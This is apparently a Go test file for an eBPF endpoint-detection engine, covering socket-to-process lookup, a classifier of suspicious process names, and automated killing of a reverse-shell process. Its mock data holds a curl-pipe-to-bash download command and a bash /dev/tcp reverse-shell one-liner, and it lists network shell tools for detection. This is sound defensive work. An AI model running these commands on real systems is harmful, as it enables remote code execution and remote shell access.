package ebpf

import (
	"sync"
	"testing"
)

func TestEDRProcessSocketCorrelation(t *testing.T) {
	engine := NewEDREngine(nil)

	tuple := SocketTuple{
		SrcIP:    "192.168.1.10",
		SrcPort:  45678,
		DstIP:    "10.0.0.1",
		DstPort:  80,
		Protocol: "TCP",
	}

	proc := ProcessContext{
		PID:         1337,
		PPID:        1,
		Comm:        "curl",
		BinaryPath:  "/usr/bin/curl",
		CommandLine: "curl -s http://10.0.0.1/malware.sh | bash",
	}

	engine.RegisterSocketProcess(proc, tuple)

	// Lookup by exact tuple
	foundProc, ok := engine.LookupProcessBySocket("192.168.1.10", 45678, "10.0.0.1", 80)
	if !ok || foundProc.PID != 1337 || foundProc.Comm != "curl" {
		t.Fatalf("Failed to lookup process by socket tuple: found=%v, proc=%+v", ok, foundProc)
	}

	// Lookup by reverse tuple
	foundReverse, ok := engine.LookupProcessBySocket("10.0.0.1", 80, "192.168.1.10", 45678)
	if !ok || foundReverse.PID != 1337 {
		t.Fatalf("Failed to lookup process by reverse socket tuple: found=%v", ok)
	}

	// Lookup by IP
	procs, ok := engine.LookupProcessByIP("10.0.0.1")
	if !ok || len(procs) != 1 || procs[0].PID != 1337 {
		t.Fatalf("Failed to lookup process by IP: found=%v, count=%d", ok, len(procs))
	}
}

func TestEDRRogueProcessClassifier(t *testing.T) {
	engine := NewEDREngine(nil)

	rogueCases := []struct {
		comm    string
		exePath string
		isRogue bool
	}{
		{"bash", "/bin/bash", true},
		{"sh", "/usr/bin/sh", true},
		{"nc", "/usr/bin/nc", true},
		{"netcat", "/bin/netcat", true},
		{"python3", "/usr/bin/python3", true},
		{"curl", "/usr/bin/curl", true},
		{"wget", "/usr/bin/wget", true},
		{"socat", "/usr/bin/socat", true},
		{"nginx", "/usr/sbin/nginx", false},
		{"copsec-collector", "/usr/local/bin/copsec-collector", false},
		{"systemd", "/usr/lib/systemd/systemd", false},
		{"sshd", "/usr/sbin/sshd", false},
	}

	for _, tc := range rogueCases {
		res := engine.IsRogueProcess(tc.comm, tc.exePath)
		if res != tc.isRogue {
			t.Errorf("IsRogueProcess(%q, %q) = %v; expected %v", tc.comm, tc.exePath, res, tc.isRogue)
		}
	}
}

func TestEDRAutonomousMitigation(t *testing.T) {
	var capturedEvents []EDRTelemetryEvent
	var mu sync.Mutex

	engine := NewEDREngine(func(event EDRTelemetryEvent) {
		mu.Lock()
		defer mu.Unlock()
		capturedEvents = append(capturedEvents, event)
	})

	tuple := SocketTuple{
		SrcIP:    "10.0.0.2",
		SrcPort:  55555,
		DstIP:    "192.168.1.100",
		DstPort:  4444,
		Protocol: "TCP",
	}

	proc := ProcessContext{
		PID:         999999, // non-existent PID for mock test
		PPID:        1234,
		Comm:        "bash",
		BinaryPath:  "/bin/bash",
		CommandLine: "bash -i >& /dev/tcp/10.0.0.2/4444 0>&1",
	}

	engine.RegisterSocketProcess(proc, tuple)

	// Perform autonomous mitigation
	ev, _ := engine.MitigateSocketAttack("10.0.0.2", 55555, "192.168.1.100", 4444, "10.0.0.2", "Reverse Shell RCE Triggered")
	if ev == nil {
		t.Fatalf("Expected mitigation event, got nil")
	}

	if ev.EventType != "EDR_KILL" || ev.ThreatScore != 100 || ev.MitreID != "T1059.004" {
		t.Fatalf("Unexpected EDR event metadata: %+v", ev)
	}

	expectedPrefix := "[EDR_KILL] Terminated rogue execution PID=999999, Comm=bash spawned by attacker 10.0.0.2"
	if ev.LogMessage != expectedPrefix {
		t.Fatalf("Expected log message %q, got %q", expectedPrefix, ev.LogMessage)
	}

	mu.Lock()
	if len(capturedEvents) != 1 {
		t.Fatalf("Expected 1 captured EDR event, got %d", len(capturedEvents))
	}
	mu.Unlock()
}
